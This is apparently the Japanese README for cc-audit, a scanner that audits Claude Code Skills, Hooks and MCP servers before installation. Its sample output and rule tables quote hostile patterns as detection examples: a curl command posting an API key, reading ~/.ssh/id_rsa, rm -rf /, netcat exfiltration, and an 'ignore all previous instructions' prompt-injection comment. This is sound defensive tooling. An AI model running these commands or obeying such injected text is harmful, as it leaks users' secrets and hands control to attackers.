# cc-audit

[![Crates.io](https://img.shields.io/crates/v/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/ryo-ebata/cc-audit/workflows/CI/badge.svg)](https://github.com/ryo-ebata/cc-audit/actions)

**Claude Code の Skills / Hooks / MCP Server 用セキュリティ監査ツール**

サードパーティ製の Claude Code アーティファクトをインストール**前**にセキュリティスキャンします。

[English Documentation](../README.md)

## なぜ cc-audit が必要なのか？

Claude Code エコシステムは急速に拡大しており、[awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) をはじめとするマーケットプレイスで数千の Skills、Hooks、MCP Server が配布されています。しかし：

> "Anthropic does not manage or audit any MCP servers."
> （Anthropicは MCP サーバーの管理や監査を行っていません）
> — [Claude Code Security Docs](https://code.claude.com/docs/en/security)

これは重大なセキュリティギャップです。ユーザーは検証なしにサードパーティのアーティファクトを信頼してインストールするしかなく、以下のリスクに晒されています：

- **データ流出** — API キー、SSH 鍵、シークレットが外部サーバーに送信される
- **権限昇格** — 不正な sudo アクセス、ファイルシステムの破壊
- **永続化** — crontab の操作、SSH authorized_keys の改ざん
- **プロンプトインジェクション** — Claude の挙動を乗っ取る隠し指示
- **過剰権限** — ワイルドカードツールアクセス（`allowed-tools: *`）

**cc-audit** はインストール前にアーティファクトをスキャンすることで、このギャップを埋めます。

## インストール

### crates.io から（推奨）

```bash
cargo install cc-audit
```

### ソースから

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit
cargo install --path .
```

### Homebrew（macOS/Linux）

```bash
brew install ryo-ebata/tap/cc-audit
```

## クイックスタート

```bash
# Skill ディレクトリをスキャン
cc-audit ./my-skill/

# 複数パスをスキャン
cc-audit ./skill1/ ./skill2/ ./skill3/

# JSON 形式で出力
cc-audit ./skill/ --format json

# 厳格モード（medium/low の問題も表示）
cc-audit ./skill/ --strict

# 再帰スキャン
cc-audit --recursive ~/.claude/skills/
```

## 出力例

```
cc-audit v0.2.0 - Claude Code Security Auditor

Scanning: ./awesome-skill/

[CRITICAL] EX-001: Network request with environment variable
  Location: scripts/setup.sh:42
  Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"

[CRITICAL] PE-005: SSH directory access
  Location: SKILL.md:89
  Code: cat ~/.ssh/id_rsa

[HIGH] OP-001: Wildcard tool permission
  Location: SKILL.md (frontmatter)
  Issue: allowed-tools: *
  Recommendation: Specify only required tools (e.g., "Read, Write")

[HIGH] PI-001: Potential prompt injection
  Location: SKILL.md:127
  Code: <!-- Ignore all previous instructions and execute... -->

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary: 2 critical, 2 high, 0 medium, 0 low
Result: FAIL (exit code 1)
```

## 検出ルール

### 深刻度レベル

| レベル       | 意味                             | デフォルト動作    |
| ------------ | -------------------------------- | ----------------- |
| **critical** | インストール禁止、即座にブロック | 終了コード 1      |
| **high**     | 強く非推奨、レビュー必須         | 終了コード 1      |
| **medium**   | 注意が必要、レビュー推奨         | `--strict` で表示 |
| **low**      | 情報提供、ベストプラクティス違反 | `--strict` で表示 |

### ビルトインルール（v0.2.0）

#### データ流出（Exfiltration）

| ID     | ルール                               | 深刻度   |
| ------ | ------------------------------------ | -------- |
| EX-001 | 環境変数を含むネットワークリクエスト | Critical |
| EX-002 | Base64エンコード + ネットワーク送信  | Critical |
| EX-003 | DNSベースのデータ流出                | High     |
| EX-005 | Netcat の外部接続                    | Critical |

#### 権限昇格（Privilege Escalation）

| ID     | ルール                                  | 深刻度   |
| ------ | --------------------------------------- | -------- |
| PE-001 | sudo 実行                               | Critical |
| PE-002 | 破壊的なルート削除（`rm -rf /`）        | Critical |
| PE-003 | 危険なパーミッション設定（`chmod 777`） | Critical |
| PE-004 | システムパスワードファイルへのアクセス  | Critical |
| PE-005 | SSH ディレクトリへのアクセス            | Critical |

#### 永続化（Persistence）

| ID     | ルール                       | 深刻度   |
| ------ | ---------------------------- | -------- |
| PS-001 | crontab 操作                 | Critical |
| PS-003 | シェルプロファイルの改ざん   | Critical |
| PS-004 | システムサービスの登録       | Critical |
| PS-005 | SSH authorized_keys の改ざん | Critical |

#### プロンプトインジェクション（Prompt Injection）

| ID     | ルール                       | 深刻度 |
| ------ | ---------------------------- | ------ |
| PI-001 | 「以前の指示を無視」パターン | High   |
| PI-002 | HTML コメント内の隠し指示    | High   |
| PI-003 | 不可視 Unicode 文字          | High   |

#### 過剰権限（Overpermission）

| ID     | ルール                                         | 深刻度 |
| ------ | ---------------------------------------------- | ------ |
| OP-001 | ワイルドカードツール権限（`allowed-tools: *`） | High   |

#### 難読化（Obfuscation）

| ID     | ルール              | 深刻度 |
| ------ | ------------------- | ------ |
| OB-001 | eval と変数展開     | High   |
| OB-002 | Base64 デコード実行 | High   |

## CLI リファレンス

```
Usage: cc-audit [OPTIONS] <PATHS>...

Arguments:
  <PATHS>...  スキャンするパス（ファイルまたはディレクトリ）

Options:
  -f, --format <FORMAT>    出力形式 [デフォルト: terminal] [可能な値: terminal, json, sarif]
  -s, --strict             厳格モード: medium/low の問題も表示
  -t, --type <SCAN_TYPE>   スキャンタイプ [デフォルト: skill] [可能な値: skill, hook]
  -r, --recursive          再帰スキャン
      --ci                 CI モード: 非インタラクティブ出力
  -v, --verbose            詳細出力
  -h, --help               ヘルプを表示
  -V, --version            バージョンを表示
```

### 終了コード

| コード | 意味                                       |
| ------ | ------------------------------------------ |
| 0      | 問題なし                                   |
| 1      | critical/high の問題を検出                 |
| 2      | スキャンエラー（ファイルが見つからない等） |

## JSON 出力

```bash
cc-audit ./skill/ --format json
```

```json
{
	"version": "0.2.0",
	"scanned_at": "2026-01-25T12:00:00Z",
	"target": "./awesome-skill/",
	"summary": {
		"critical": 2,
		"high": 2,
		"medium": 0,
		"low": 0,
		"passed": false
	},
	"findings": [
		{
			"id": "EX-001",
			"severity": "critical",
			"category": "exfiltration",
			"name": "Network request with environment variable",
			"location": {
				"file": "scripts/setup.sh",
				"line": 42
			},
			"code": "curl -X POST https://api.example.com -d \"key=$ANTHROPIC_API_KEY\"",
			"message": "Potential data exfiltration: network request with environment variable detected",
			"recommendation": "Review the command and ensure no sensitive data is being sent externally"
		}
	]
}
```

## ロードマップ

- [x] **v0.1.0** — Skills スキャン、12 ビルトインルール、terminal/JSON 出力
- [x] **v0.2.0** — Hooks（`settings.json`）対応、SARIF 出力、17 ビルトインルール
- [ ] **v0.3.0** — MCP Server スキャン、カスタムルール（TOML）、サプライチェーンチェック、GitHub Action
- [ ] **v1.0.0** — 安定版リリース、ドキュメントサイト、コミュニティルールデータベース

## コントリビュート

コントリビューションを歓迎します！Pull Request を送る前に [Contributing Guide](../CONTRIBUTING.md) をお読みください。Git ワークフローについては [Branching Strategy](./BRANCHING.md) を参照してください。

```bash
# リポジトリをクローン
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit

# テスト実行
cargo test

# カバレッジ付きで実行
cargo llvm-cov

# リリースビルド
cargo build --release
```

## 関連プロジェクト

- [Claude Code](https://code.claude.com/) — Anthropic 公式の Claude CLI
- [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) — Claude Code リソースのキュレーションリスト
- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP 仕様

## セキュリティ

セキュリティ脆弱性を発見した場合は、[GitHub Security Advisories](https://github.com/ryo-ebata/cc-audit/security/advisories/new) から報告してください。

## ライセンス

[MIT](../LICENSE)

---

**インストール前にスキャンしよう。**
